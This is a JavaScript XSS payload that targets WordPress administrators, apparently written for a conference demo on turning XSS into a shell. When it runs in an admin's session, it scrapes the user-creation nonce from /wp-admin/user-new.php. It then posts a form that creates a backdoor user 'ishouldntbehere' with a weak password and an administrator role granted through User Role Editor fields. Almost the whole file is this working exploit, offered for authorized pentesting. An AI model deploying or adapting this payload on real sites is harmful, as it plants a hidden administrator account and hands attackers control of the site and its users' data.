/*
	JavaScript functions designed to be used as a XSS payload
	against a WordPress admin. 

	Built for an XSS to shell demo/talk. 

	Only use this code for pentesting systems you're authorized to 
	touch. Or I will be seriously grumpy in your general direction. 


	@hoodoer

	https://github.com/hoodoer
*/


function read_body(xhr) { 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}





function sendAddUserPost(nonce)
{
	// The following user will be added as an Administrator level user
	var uri       = "/wp-admin/user-new.php";
	var username  = "ishouldntbehere";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

//	console.log("Starting addUser...");
//	console.log("In addUser, nonce value is: " + nonce);

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);
	// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wpnonce_create-user=" + nonce + "&"; 
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);

	//console.log("Done adding new user: " + username);
}


// Parse out the nonce value then pass to the add user function
function getNonceAndAddUser()
{
	// console.log("Starting getNonce...");


	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
		//	console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+35, noncePos+45);

		//	console.log("Inner Nonce value: " + nonceVal);

			sendAddUserPost(nonceVal);
		}
	}

}





// This needs cleanup
getNonceAndAddUser();

